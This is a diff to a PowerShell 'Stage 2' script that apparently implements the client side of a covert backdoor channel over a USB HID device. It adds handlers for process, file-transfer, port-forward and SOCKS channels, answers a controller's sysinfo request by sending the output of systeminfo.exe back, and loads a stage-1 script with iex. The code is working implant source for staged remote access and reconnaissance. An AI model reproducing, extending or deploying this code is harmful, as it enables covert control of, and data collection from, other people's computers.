@@ -1,4 +1,6 @@
-﻿###################################################
+﻿
+
+###################################################
 # Create LinkLayer Custom Object (Stage 2 work)
 ###################################################
 
@@ -221,13 +223,13 @@ $LinkLayer | Add-Member -MemberType ScriptMethod -Name "Init" -Value {
 
             # if this bit isn't set $inbytes[2] contains the SEQ number, 
             # if thi bit is set $inbytes[2] contains the SEQ number of a retransmission - invalidating all reports received after this SEQ number (unused right now)
-            $BYTE2_BIT6_RESEND_REQUEST = $state.invalid_seq_received # set resend bit, if last report read has been invalid (out of order)
+            $BYTE1_BIT6_RESEND_REQUEST = $state.invalid_seq_received # set resend bit, if last report read has been invalid (out of order)
 
 #$hostui.WriteLine("Writer: Current stream $current_stream") 
 #$hostui.WriteLine("Writer: Payload $payload") 
 #$hostui.WriteLine("Writer: Outbytes $outbytes")
          
-            if ($BYTE2_BIT6_RESEND_REQUEST)
+            if ($BYTE1_BIT6_RESEND_REQUEST)
             { 
                 $outbytes[1] = $outbytes[1] -bor 64 # set resend flag if necessary
                 $next_needed = $state.last_valid_seq_received + 1 # Request resending, beginning from the successor report of the last in-order-report received
@@ -247,7 +249,7 @@ $LinkLayer | Add-Member -MemberType ScriptMethod -Name "Init" -Value {
         
 # DEBUG
 #$as = $outbytes[2] 
-#if ($BYTE2_BIT6_RESEND_REQUEST)
+#if ($BYTE1_BIT6_RESEND_REQUEST)
 #{ $hostui.WriteLine("Writer: Send resend request beginning from SEQ $as") }
 #else
 #{ $hostui.WriteLine("Writer: Send report with ACK $as") }
@@ -484,18 +486,105 @@ function TEST_enqueue_ouput($LinkLayer, $stream_size, $max_bytes)
 }
 
 
+###
+# Client implementatopn
+#######
+function parse_stream()
+{
+    param([Byte[]] $stream)
 
-$HIDin = $devfile
-$HIDout = $devfile
+    $channel_type = $stream[0] -band 15
+    $channel_subtype = $stream[0] -shr 4
+    if ($stream.Length -gt 1)
+    {
+        $data = [Byte[]] $stream[1..($stream.Length-1)]
+    }
+    else
+    {
+        $data = $null
+    }
+
+    Remove-Variable stream
+
+    return @{channel_type=$channel_type; channel_subtype=$channel_subtype; data=$data}
+}
+
+
+function send_data()
+{
+    param($channel_type, $channel_subtype, $data)
+
+    $stream = [Byte[]] ($channel_type + ($channel_subtype -shl 4)) + ($data)
+    $LinkLayer.PushOutputStream($stream)
+}
+
+function handle_request()
+{
+    param([Byte[]] $stream)
+
+    $parsed = parse_stream($stream)
+
+    $CHANNEL_TYPE_CONTROL = 1 # must exist only once
+    $CHANNEL_TYPE_SOCKET = 2
+    $CHANNEL_TYPE_PROCESS = 3
+    $CHANNEL_TYPE_FILE_TRANSFER = 4
+    $CHANNEL_TYPE_PORT_FORWARD = 5
+    $CHANNEL_TYPE_SOCKS = 6
+
+    $CHANNEL_SUBTYPE_CONTROL_CLIENT_STAGE2_REQUEST = 1 # send by peer (client) if it wants to receive stage2
+    $CHANNEL_SUBTYPE_CONTROL_SERVER_STAGE2_RESPONSE = 1 # send by us (server) while delivering stage 2 (uses same value as request, as this is$
+    $CHANNEL_SUBTYPE_CONTROL_CLIENT_STAGE2_RCVD = 2 # send by peer if stage 2 is received completly
+    $CHANNEL_SUBTYPE_CONTROL_SERVER_SYSINFO_REQUEST = 3
+    $CHANNEL_SUBTYPE_CONTROL_CLIENT_SYSINFO_RESPONSE = 3
+
+    if ($parsed.channel_type -eq $CHANNEL_TYPE_CONTROL)
+    {
+        # control channel
+        if ($parsed.channel_subtype -eq $CHANNEL_SUBTYPE_CONTROL_SERVER_SYSINFO_REQUEST)
+        {
+            [Console]::WriteLine("Received sysinfo request")
+            send_data -channel_type $CHANNEL_TYPE_CONTROL -channel_subtype $CHANNEL_SUBTYPE_CONTROL_CLIENT_SYSINFO_RESPONSE -data ([System.Text.Encoding]::UTF8.GetBytes((systeminfo.exe | Out-String)))
+            #send_data -channel_type $CHANNEL_TYPE_CONTROL -channel_subtype $CHANNEL_SUBTYPE_CONTROL_CLIENT_SYSINFO_RESPONSE -data ([System.Text.Encoding]::UTF8.GetBytes("üÜäÄ"))
+        }
+    }
+    else
+    {
+        [Console]::WriteLine("unknown channel type {0}" -f $parsed.channel_type)
+    }
+
+}
+
+
+# vars are created by stage1
+#$HIDin = $devfile
+#$HIDout = $devfile
+
+#####
+# DEBUG
+
+$stage1 = Get-Content fullduplex_stage1.ps1 | Out-String # we load stage 2 from disk
+iex $stage1
+
+# END DEBUG
+#######
+
+
+# assure correct encoding if system commands are ran
+$OutputEncoding = New-Object -TypeName System.Text.UTF8Encoding
+[Console]::OutputEncoding = New-Object -TypeName System.Text.UTF8Encoding
+[Console]::WriteLine("Encoding set to UTF8... Test üÜ")
+
+
 
 $LinkLayer.Init($HIDin, $HIDout) # init link layer state
 
-$LinkLayer.Connect() # synchronize connection
+$LinkLayer.Connect() # re-synchronize full duplex connection (resets python server queues and re-syncs ACK to SEQ)
+
 
 
 try
 {
-    $LinkLayer.Start() # start link layer threads (HID reader and writer)
+    $LinkLayer.Start() # start link layer threads (we quit STOP-AND-WAIT ARQ and turn over to GO-BACK-N to achieve full duplex transfer speed)
     
 
     ##################
@@ -524,19 +613,25 @@ try
         Start-Sleep -m 100
         
         # go on processing inbound data
-        while ($LinkLayer.PendingInputStreamCount() -gt 0) # print out fully captured streams
+        while ($LinkLayer.PendingInputStreamCount()) # print out fully captured streams
         {
             # pop and throw away, we only count received bytes
             $stream = $LinkLayer.PopPendingInputStream()
             $utf8 = ([System.Text.Encoding]::UTF8.GetString($stream))
             $host.UI.WriteLine("{0}" -f $utf8) 
+
+            handle_request -stream $stream
+
+            #$parsed = parse_stream $stream
+            #$host.UI.WriteLine($parsed)
+            #$host.UI.WriteLine($parsed[2])
         }
 
-        # enque output
-        $stream_size = 10*$LinkLayer.globalstate.PAYLOAD_MAX_SIZE
-        #$max_bytes = 62*1024 + $stream_size
-        $max_bytes = 6200
-        TEST_enqueue_ouput $LinkLayer $stream_size $max_bytes
+      #  # enque output
+      #  $stream_size = 10*$LinkLayer.globalstate.PAYLOAD_MAX_SIZE
+      #  #$max_bytes = 62*1024 + $stream_size
+      #  $max_bytes = 6200
+      #  TEST_enqueue_ouput $LinkLayer $stream_size $max_bytes
     }
 }
 finally
